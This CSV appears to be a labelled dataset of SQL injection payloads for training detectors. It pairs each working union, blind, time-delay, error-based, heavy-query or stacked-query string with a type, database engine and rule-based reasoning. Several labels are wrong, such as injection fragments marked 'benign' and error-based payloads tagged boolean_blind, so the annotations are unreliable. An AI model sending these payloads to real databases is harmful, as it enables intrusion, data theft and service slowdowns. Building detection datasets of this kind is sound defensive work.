id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19754,"-1337"" ) union all select 7508--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19755,"-2722"" ) or 4907 = 8126#",boolean_blind,generic,0.95,Payload contains 'or 4907 = 8126' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19756,"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""ardk"" like ""ardk",error_based,postgresql,0.7,Payload contains 'cast(...::text)' -> error_based (priority P4). DB engine 'postgresql'; DB hint token '::text'. Selected lowest-priority among 1 signal(s).,1
19757,"1%"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.85,"Payload contains 'elt(', 'union select' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19758,"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'wytg' = 'wytg",heavy_query,postgresql,0.95,"Payload contains 'generate_series(1,5000000)' -> heavy_query (priority P4). DB engine 'postgresql'; DB hint token 'generate_series'. Selected lowest-priority among 1 signal(s).",3
19759,"1%"" ) union all select null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19760,1'|| ( select 'gnil' from dual where 7552 = 7552 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) ||',boolean_blind,mysql,0.95,Payload contains 'rlike(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'from dual'. Selected lowest-priority among 1 signal(s).,3
19761,1 ) ) as uvep where 6016 = 6016 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19762,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'vpqr' = 'vpqr,time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19763,"1', ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )",time_blind,mssql,0.95,Payload contains 'waitfor delay' -> time_blind (priority P5). DB engine 'mssql'; DB hint token 'waitfor delay'. Selected lowest-priority among 1 signal(s).,3
19764,"1"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""cowu"" like ""cowu",time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19765,-5211 union all select 1754--,union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19766,"1"" ) as bpmk where 6412 = 6412 union all select null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19767,"1 ) ) as mgvw where 4923 = 4923 union all select null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19768,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'kqip' like 'kqip",boolean_blind,mysql,0.85,Payload contains 'elt(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19769,"-9054"" ) as rgyu where 3792 = 3792 order by 1--",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '-9054"" ) as rgyu where 3792 = 3792 order by 1--' suggests boolean fragment",2
19770,-6766' ) ) ) or 3038 = 3038,boolean_blind,generic,0.95,Payload contains 'or 3038 = 3038' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19771,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'yqrt' like 'yqrt",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19772,1 ) as vqdh where 1603 = 1603,benign,generic,0.5,UNCERTAIN: payload '1 ) as vqdh where 1603 = 1603' has no recognized SQLi function/keyword pattern,2
19773,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'yiem' = 'yiem",boolean_blind,mysql,0.85,Payload contains 'elt(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'information_schema'. Selected lowest-priority among 1 signal(s).,2
19774,"1%"" ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,"Payload contains 'sysibm.systables as t1,t2,t3' -> heavy_query (priority P4). DB engine 'db2'; DB hint token 'sysibm.systables'. Selected lowest-priority among 1 signal(s).",1
19775,"1' in boolean mode ) union all select null,null,null,null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19776,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""cgpm"" like ""cgpm",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'union select' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19777,"1"" where 5250 = 5250",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1"" where 5250 = 5250' suggests boolean fragment",2
19778,"1' ) ) as umah where 3781 = 3781 union all select null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19779,( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( select 9525 from master..sysdatabases ) end ) ),benign,generic,0.5,UNCERTAIN: payload '( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( ' has no recognized SQLi function/keyword pattern,1
19780,"-9315' ) ) ) union all select 5057,5057,5057,5057,5057#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19781,"-2962' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'hkjo' = 'hkjo",error_based,mssql,0.7,"Payload contains 'convert(int,' -> error_based (priority P4). DB engine 'mssql'; DB hint token 'convert ( int'. Selected lowest-priority among 1 signal(s).",1
19782,1 ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 2197 = 2197,boolean_blind,mysql,0.95,Payload contains 'rlike(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'rlike'. Selected lowest-priority among 1 signal(s).,3
19783,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.95,Payload contains 'dbms_pipe.receive_message' -> time_blind (priority P5). DB engine 'oracle'; DB hint token 'dbms_pipe'. Selected lowest-priority among 1 signal(s).,3
19784,1' where 3337 = 3337 and 8403 = 5760,boolean_blind,generic,0.95,Payload contains 'and 8403 = 5760' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19785,"1"" or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,"Payload contains 'rdb$fields,rdb$types cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'rdb$fields'. Selected lowest-priority among 1 signal(s).",1
19786,"1 ) ) as faxr where 7972 = 7972 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,"Payload contains 'all_users t1,all_users t2,...' -> heavy_query (priority P4). DB engine 'oracle'; DB hint token 'all_users'. Selected lowest-priority among 1 signal(s).",1
19787,"1"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vurb"" like ""vurb",out_of_band,oracle,0.7,Payload contains 'dbms_utility.sqlid_to_sqlhash' -> out_of_band (priority P6). DB engine 'oracle'; DB hint token 'from dual'. Selected lowest-priority among 1 signal(s).,1
19788,1 ) where 8094 = 8094,benign,generic,0.5,UNCERTAIN: payload '1 ) where 8094 = 8094' has no recognized SQLi function/keyword pattern,2
19789,"1%' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'exp(~' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19790,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'jirc' = 'jirc,time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19791,"1'+ ( select 'ples' where 4244 = 4244 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) +'",error_based,mysql,0.85,Payload contains 'extractvalue(' -> error_based (priority P4). DB engine 'mysql'; DB hint token 'extractvalue'. Selected lowest-priority among 1 signal(s).,2
19792,"1%"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,heavy_query,firebird,0.7,"Payload contains 'domain.domains,domain.tables cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'domain.domains'. Selected lowest-priority among 1 signal(s).",1
19793,"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- yekf",heavy_query,firebird,0.7,"Payload contains 'rdb$fields,rdb$types cartesian' -> heavy_query (priority P4). DB engine 'firebird'; DB hint token 'rdb$fields'. Selected lowest-priority among 1 signal(s).",1
19794,if ( 8574 = 7534 ) select 8574 else drop function nxbe--,stacked_queries,generic,0.7,Payload contains 'drop function' -> stacked_queries (priority P8). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,1
19795,1' ) and 7533 = 7533,boolean_blind,generic,0.95,Payload contains 'and 7533 = 7533' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19796,"1 ) union all select null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19797,1'|| ( select 'scct' where 2587 = 2587 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) ||',time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19798,-6449' ) ) or 2590 = 2848,boolean_blind,generic,0.95,Payload contains 'or 2590 = 2848' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19799,1' where 3362 = 3362,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1' where 3362 = 3362' suggests boolean fragment",2
19800,-1252' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'pzxh' like 'pzxh,out_of_band,oracle,0.7,Payload contains 'dbms_utility.sqlid_to_sqlhash' -> out_of_band (priority P6). DB engine 'oracle'; DB hint token 'from dual'. Selected lowest-priority among 1 signal(s).,1
19801,-8684' where 9820 = 9820 or 6844 = 5105,boolean_blind,generic,0.95,Payload contains 'or 6844 = 5105' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19802,"1%' ) ) ) union all select null,null,null,null--",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19803,"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'inrm' like 'inrm",time_blind,mysql,0.85,Payload contains 'benchmark(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19804,"( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 2768 = 2768,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",boolean_blind,mysql,0.85,Payload contains 'elt(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'information_schema'. Selected lowest-priority among 1 signal(s).,2
19805,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19806,"1%' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"Payload contains 'generate_series(1,5000000)' -> heavy_query (priority P4). DB engine 'postgresql'; DB hint token 'generate_series'. Selected lowest-priority among 1 signal(s).",3
19807,select sleep ( 5 ) ) +',time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19808,"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19809,( select ( case when ( 3950 = 2747 ) then 1 else 1/ ( select 0 ) end ) ),benign,generic,0.5,UNCERTAIN: payload '( select ( case when ( 3950 = 2747 ) then 1 else 1/ ( select' has no recognized SQLi function/keyword pattern,1
19810,"1%' ) union all select null,null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19811,select ( case when ( 4755 = 4784 ) then 1 else 4755* ( select 4755 from master..sysdatabases ) end ) --,benign,generic,0.5,UNCERTAIN: payload 'select ( case when ( 4755 = 4784 ) then 1 else 4755* ( selec' has no recognized SQLi function/keyword pattern,1
19812,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""jtgs"" like ""jtgs",heavy_query,oracle,0.7,"Payload contains 'all_users t1,all_users t2,...' -> heavy_query (priority P4). DB engine 'oracle'; DB hint token 'all_users'. Selected lowest-priority among 1 signal(s).",1
19813,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'nqol' = 'nqol,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19814,"1%' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( '%' = '",boolean_blind,mysql,0.85,Payload contains 'elt(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'information_schema'. Selected lowest-priority among 1 signal(s).,2
19815,1' where 6168 = 6168,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1' where 6168 = 6168' suggests boolean fragment",2
19816,"1'|| ( select 'zvpl' where 5877 = 5877 union all select null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19817,"1"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""nevr"" like ""nevr",time_blind,sqlite,0.85,Payload contains 'randomblob(' -> time_blind (priority P5). DB engine 'sqlite'; DB hint token 'randomblob'. Selected lowest-priority among 1 signal(s).,2
19818,"-6772"" ) ) or 9323 = 9323#",boolean_blind,generic,0.95,Payload contains 'or 9323 = 9323' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19819,"1"" and ( 7597 = 8422 ) *8422 and ""gywp"" like ""gywp",boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1"" and ( 7597 = 8422 ) *8422 and ""gywp"" like ""gywp' suggests boolean fragment",2
19820,1 where 7452 = 7452 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Payload contains 'pg_sleep(' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'pg_sleep'. Selected lowest-priority among 1 signal(s).,2
19821,"1 ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 7200 = 7200",heavy_query,db2,0.7,"Payload contains 'sysibm.systables as t1,t2,t3' -> heavy_query (priority P4). DB engine 'db2'; DB hint token 'sysibm.systables'. Selected lowest-priority among 1 signal(s).",1
19822,"-3769"" ) ) ) union all select 8456#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19823,1'+ ( select 'vjoj' where 5348 = 5348,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1'+ ( select 'vjoj' where 5348 = 5348' suggests boolean fragment",3
19824,"1%' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19825,1' ) ) ) or sleep ( 5 ) and ( ( ( 'ecur' = 'ecur,time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19826,-4828%' ) or 8678 = 5745#,boolean_blind,generic,0.95,Payload contains 'or 8678 = 5745' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19827,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19828,"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""afby"" = ""afby",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'sleep(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 2 signal(s).",2
19829,"-7518"" or elt ( 8413 = 3995,3995 ) and ""cpnf"" = ""cpnf",boolean_blind,mysql,0.85,Payload contains 'elt(' -> boolean_blind (priority P3). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19830,"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'yqhk' = 'yqhk",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'updatexml(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'updatexml'. Selected lowest-priority among 2 signal(s).",2
19831,"1'|| ( select 'xuou' from dual where 7681 = 7681 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",boolean_blind,mysql,0.85,"Payload contains 'elt(', 'extractvalue(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'from dual'. Selected lowest-priority among 2 signal(s).",2
19832,"1"" ) and 7533 = 7533 and ( ""yqzq"" = ""yqzq",boolean_blind,generic,0.95,Payload contains 'and 7533 = 7533' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19833,1 ) ) as vryv where 5600 = 5600,benign,generic,0.5,UNCERTAIN: payload '1 ) ) as vryv where 5600 = 5600' has no recognized SQLi function/keyword pattern,2
19834,"-5013' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'ehwh' like 'ehwh",error_based,mssql,0.7,"Payload contains 'convert(int,' -> error_based (priority P4). DB engine 'mssql'; DB hint token 'convert ( int'. Selected lowest-priority among 1 signal(s).",1
19835,"-3441' ) ) as dxvt where 9291 = 9291 union all select 9291,9291,9291#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19836,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dqis"" = ""dqis",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19837,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 1773 = 1773",time_blind,mysql,0.85,Payload contains 'benchmark(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
19838,"1 ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19839,"1"" ) ) union all select null,null,null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19840,1 where 3502 = 3502 order by 1--,benign,generic,0.5,UNCERTAIN: payload '1 where 3502 = 3502 order by 1--' has no recognized SQLi function/keyword pattern,2
19841,"1'+ ( select 'ejox' where 2719 = 2719 union all select null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19842,1%' ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,Payload contains 'sleep(' -> time_blind (priority P5). DB engine 'mysql'. Selected lowest-priority among 1 signal(s).,2
